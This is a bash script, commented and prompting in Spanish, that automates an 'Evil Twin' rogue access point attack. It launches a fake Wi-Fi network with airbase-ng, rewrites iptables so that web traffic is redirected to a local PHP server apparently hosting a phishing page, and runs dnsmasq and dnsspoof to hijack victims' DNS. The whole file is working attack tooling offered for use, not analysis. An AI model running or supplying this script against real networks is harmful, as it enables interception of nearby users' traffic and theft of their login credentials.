#!/bin/bash

# EvilTwin attack R1pFr4n
# https://rstforums.com/forum/topic/110254-evil-twin-attack-the-definitive-guide/

#Colours 
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
turquoiseColour="\e[0;36m\033[1m"

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n\n${redColour}[!] Exiting...${redColour}"
	killall airbase-ng dnsmasq dnsspoof php > /dev/null 2>&1
	tput cnorm
    exit 0
}

function startAttack(){
	clear
	active=$(iwconfig wlx00c0cab03c17 | grep "Monitor")
	if [[ $active == "" ]]; then
		echo -e "\n${redColour}[*] Monitor mode required${endColour}"
			exit 1
	else
		echo -ne "\n${turquoiseColour}[*] Nombre de la targeta de red (default wlx00c0cab03c17): ${endColour}"
		read netd
		if [[ $netd == "" ]]; then
		    netd="wlx00c0cab03c17"
		fi

		echo -ne "\n${turquoiseColour}[*] Nombre del punto de acceso: (default wprueba): ${endColour}"
		read ap
		if [[ $ap == "" ]]; then
		    ap="wprueba"
		fi

		echo -ne "\n${turquoiseColour}[*] Canal del AP: (default: 1): ${endColour}"
		read channel
		if [[ $channel == "" ]]; then
		    channel="1"
		fi

		echo -e "\n\t${turquoiseColour}Targeta de red:${endColour} ${redColour}$netd${endColour}"
		echo -e "\t${turquoiseColour}AP:${endColour} ${redColour}$ap${endColour}"
		echo -e "\t${turquoiseColour}Canal:${endColour} ${redColour}$channel${endColour}"

		echo -e "\n${blueColour}[*] Iniciando airebase-ng...${endColour}" 
		airbase-ng  -e $ap -c $channel $netd > /dev/null 2>&1 &
		sleep 2
		echo -e "\n${blueColour}[*] Configurando interfaz at0 e iptables...${endColour}"
		ifconfig at0 10.0.0.1 up
		sleep 1
		iptables --flush
		iptables --delete-chain
		iptables --table nat --flush
		iptables --table nat --delete-chain
		iptables --table nat --append POSTROUTING --out-interface ens33 -j MASQUERADE
		iptables --append FORWARD --in-interface at0 -j ACCEPT 
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
		iptables -t nat -A POSTROUTING -j MASQUERADE
		echo 1 > /proc/sys/net/ipv4/ip_forward
		sleep 1

		echo -e "\n${blueColour}[*] Iniciando dnsmasq...${endColour}"
		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
		sleep 2
		echo -e "\n${blueColour}[*] Iniciando servidor php y mysql...${endColour}"
		systemctl start mysql > /dev/null 2>&1
		cd Rogue_AP
		php -S 0.0.0.0:80 > /dev/null 2>&1 &
		sleep 1
		echo -e "\n${blueColour}[*] Iniciando dns spoofing...${endColour}"
		dnsspoof -i at0 > /dev/null 2>&1 &
		sleep 1
		echo -e "\n[*] Inicializacion correcta"
		sleep 2
		../utils.sh
	fi
}

#Main 
	startAttack
